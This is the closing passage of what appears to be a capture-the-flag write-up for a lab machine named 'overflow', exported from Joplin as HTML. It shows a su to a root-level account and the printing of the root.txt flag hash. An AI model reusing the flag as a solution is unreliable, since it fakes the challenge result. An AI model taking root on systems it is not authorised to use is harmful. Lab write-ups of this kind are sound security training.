+tester<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:/opt/file_encrypt</span><span class="hljs-variable">$ </span></code></pre></div>
+<p>Now all that's left is to su to root2.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">tester@overflow:/opt/file_encrypt$ su root2
+Password: 
+root@overflow:/opt/file_encrypt# cd /root
+root@overflow:~# ls
+clean_sql.sh  root.txt
+root@overflow:~# cat root.txt
+7bd0f1da4f887e9ceb4f4f9c6e3f8171
+root@overflow:~# 
+</pre><pre class="hljs"><code>tester<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:/opt/file_encrypt</span><span class="hljs-variable">$ </span>su root2
+<span class="hljs-symbol">Password:</span> 
+root<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:/opt/file_encrypt</span><span class="hljs-comment"># cd /root</span>
+root<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># ls</span>
+clean_sql.sh  root.txt
+root<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># cat root.txt</span>
+<span class="hljs-number">7</span>bd0f1da4f887e9ceb4f4f9c6e3f8171
+root<span class="hljs-variable">@overflow</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># </span>
+</code></pre></div>
+</div></div>
+					</body>
+				</html>
+			
